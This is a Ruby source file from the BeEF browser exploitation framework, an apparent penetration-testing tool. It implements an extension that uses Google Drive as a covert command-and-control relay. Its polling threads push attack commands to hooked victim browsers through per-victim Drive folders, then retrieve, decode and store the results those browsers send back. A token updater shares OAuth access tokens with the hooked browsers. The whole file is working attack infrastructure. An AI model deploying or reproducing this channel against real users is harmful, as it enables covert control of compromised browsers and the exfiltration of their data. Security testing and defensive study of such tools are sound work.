# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
  module Extension
    module Gdrive
      class Gdrive
        
        include Singleton
        require 'json'
        require 'base64'
        require 'net/http'

        include BeEF::Core::Handlers::Modules::Command
        MOUNTS = BeEF::Core::Server.instance.mounts

        def initialize
          @@config = BeEF::Core::Configuration.instance
          @@key_file_id      = ''
          @@init_folder_id   = ''
          @@answer_folder_id = ''
        end
        
        def start_command_server
            command_server = Thread.new{
                while true
                  sleep 5
                  hds = BeEF::Core::Models::HookedBrowser.all()
                  for hooked_browser in hds
                    hooked_browser.lastseen = Time.new.to_i
                    hooked_browser.count!
                    hooked_browser.save
                    zombie_commands = BeEF::Core::Models::Command.all(:hooked_browser_id => hooked_browser.id,
                                                                      :instructions_sent => false)
                    zombie_commands.each { |command| add_command_instructions(command, hooked_browser) }
                    #dhook
                    #xssrays
                  end
                end
            }
            command_server.abort_on_exception = true
            command_server.run
        end

        def start_data_server
          data_server = Thread.new{
            while true
              sleep 6
              data = check_answers
              next if data.nil?
              for i in data
                answers = JSON.parse i
                for answer in answers
                  command_results = Hash.new
                  command_results["data"] = Base64.decode64(answer["result"])
                  command_results["data"].force_encoding('UTF-8')
                  hooked_browser = answer["bh"]
                  handler = answer["handler"]
                  if handler.match(/command/)
                    BeEF::Core::Models::Command.save_result(hooked_browser, answer["cid"],
                    @@config.get("beef.module.#{handler.gsub("/command/", "").gsub(".js", "")}.name"), command_results,0)
                  else
                    answer["beefhook"] = hooked_browser
                    answer["results"] = JSON.parse(Base64.decode64(answer["result"]))
                    if MOUNTS.has_key?(handler)
                      if MOUNTS[handler].class == Array and MOUNTS[handler].length == 2
                        MOUNTS[handler][0].new(answer, MOUNTS[handler][1])
                      else
                        MOUNTS[handler].new(answer)
                      end
                    end
                  end
                end
              end
            end
          }
          data_server.abort_on_exception = true
          data_server.run
        end

        def start_init_server
          init_server = Thread.new{
            while true
              sleep 4
              ids = get_ids_folder @@init_folder_id
              for i in ids
                file = get_file i["id"]
                trash_file i["id"]
                next if file.nil?
                res = JSON.parse(file)
                res['results'] = JSON.parse( Base64.decode64(res['result']) )
                res['beefhook'] = res['bh']
                res['beefsession'] = nil
                BeEF::Extension::Gdrive::BrowserDetails.new( res )
              end
            end
          }
          init_server.abort_on_exception = true
          init_server.run
        end

        def start_token_updater
          updater = Thread.new {
            @@token = get_token
            upload_token @@token
            while true
              sleep(@@expires_token - 100)
              get_token
              upload_token @@token
            end
          }
          updater.abort_on_exception = true
          updater.run
        end

        def check_answers
          data = Array.new
          ids = get_ids_folder @@answer_folder_id
          for i in ids
            file = get_file i["id"]
            data.push( file )
            trash_file i["id"]
          end
          data
        end

        def upload_file title, file_data, path=nil
          uri = URI.parse("https://www.googleapis.com/upload/drive/v2/files?uploadType=multipart")
          http_post = Net::HTTP.new(uri.host, uri.port)
          http_post.use_ssl = true
          boundary = '-------answer'
          delimiter = "\r\n--" + boundary + "\r\n"
          close_delim = "\r\n--" + boundary + '--'
          base64Data = Base64.encode64(file_data) if not file_data.nil?
          multipartRequestBody =
              delimiter +
                  "Content-Type: application/json\r\n\r\n" +
                  '{"title" : "' + title.to_s + '",' +
                  "#{"\"parents\": [{ \"id\":\"#{path.to_s}\" }]," if not path.nil? }" +
                  '"mimeType": "text/plain"}' + delimiter +
                  "Content-Type: text/plain\r\n" +
                  "Content-Transfer-Encoding: base64\r\n" +
                  "\r\n" + base64Data + close_delim

          post_form = Net::HTTP::Post.new(uri.request_uri, initheader={'Authorization' => 'Bearer ' + @@token, 'Content-type' => 'multipart/mixed; boundary="'+boundary+'"'})
          post_form.body = multipartRequestBody
          http_post.request(post_form)
        end

        def trash_file file_id
          uri = URI.parse("https://www.googleapis.com/drive/v2/files/"+ file_id +"/trash")
          http_post = Net::HTTP.new(uri.host, uri.port)
          http_post.use_ssl = true
          post_form = Net::HTTP::Post.new(uri.request_uri, initheader={'Authorization' => 'Bearer ' + @@token})
          post_form.body = " "
          response = http_post.request(post_form)
          response.body
        end

        def get_ids_folder folder_id
          data = Hash.new
          data["q"] = '"'+folder_id+'" in parents and trashed=false'
          data["fields"] = "items/id"
          str = "#{URI.encode_www_form(data)}"
          uri = URI.parse("https://www.googleapis.com/drive/v2/files?"+str)
          http_get = Net::HTTP.new(uri.host, uri.port)
          http_get.use_ssl = true
          get_form = Net::HTTP::Get.new(uri.request_uri, initheader={'Authorization' => 'Bearer '+@@token})
          response = http_get.request(get_form)
          json = JSON.parse(response.body)
          json["items"]
        end

        def create_folder title
          require 'json'
          uri = URI.parse("https://www.googleapis.com/drive/v2/files")
          http_post = Net::HTTP.new(uri.host, uri.port)
          http_post.use_ssl = true
          post_form = Net::HTTP::Post.new(uri.request_uri, initheader={'Authorization' => 'Bearer ' + @@token, "Content-Type" => "application/json"})
          post_form.body = '{"title": "'+title +'", "mimeType": "application/vnd.google-apps.folder"}'
          response = http_post.request(post_form)
          json = JSON.parse(response.body)
          json['id']
        end

        def upload_command command, hook_session, command_id
          if BeEF::Core::Gdrive::Models::Custodian.first(:session => hook_session).nil?
            cmd = BeEF::Core::Gdrive::Models::Custodian.new(:session => hook_session,
                                                      :folder_name => create_folder(hook_session) )
            cmd.save
          end
          upload_file(command_id, command, 
                      BeEF::Core::Gdrive::Models::Custodian.first(:session => hook_session).folder_name )
        end

        def upload_token token
          uri = URI.parse("https://www.googleapis.com/upload/drive/v2/files/"+@@key_file_id)
          http_put = Net::HTTP.new(uri.host, uri.port)
          http_put.use_ssl = true
          put_form = Net::HTTP::Put.new(uri.request_uri, initheader={'Authorization' => 'Bearer ' + @@token})
          put_form.body = token
          response = http_put.request(put_form)
          response.body
        end

        def get_file file_id
          require 'json'
          uri = URI.parse("https://www.googleapis.com/drive/v2/files/"+file_id)
          http_get = Net::HTTP.new(uri.host, uri.port)
          http_get.use_ssl = true
          get_form = Net::HTTP::Get.new(uri.request_uri, initheader={'Authorization' => 'Bearer '+@@token})
          response = http_get.request(get_form)
          json = JSON.parse(response.body)
          uri = URI.parse(json["downloadUrl"])
          http_get = Net::HTTP.new(uri.host, uri.port)
          http_get.use_ssl = true
          get_form = Net::HTTP::Get.new(uri.request_uri, initheader={'Authorization' => 'Bearer '+@@token})
          response = http_get.request(get_form)
          response.body
        end

        def get_token
          client_id = ''
          refresh_token = ''
          client_secret = ''
          uri = URI.parse("https://accounts.google.com/o/oauth2/token")
          http_post = Net::HTTP.new(uri.host, uri.port)
          http_post.use_ssl = true

          data = {}
          data["refresh_token"] = refresh_token
          data["client_id"] = client_id
          data["client_secret"] = client_secret
          data["grant_type"] = "refresh_token"

          multipartRequestBody = "#{URI.encode_www_form(data)}"
          post_form = Net::HTTP::Post.new(uri.request_uri)
          post_form.body = multipartRequestBody
          response = http_post.request(post_form)
          json = JSON.parse(response.body)
          @@expires_token = json["expires_in"]
          json["access_token"]
        end
      end
    end
  end
end
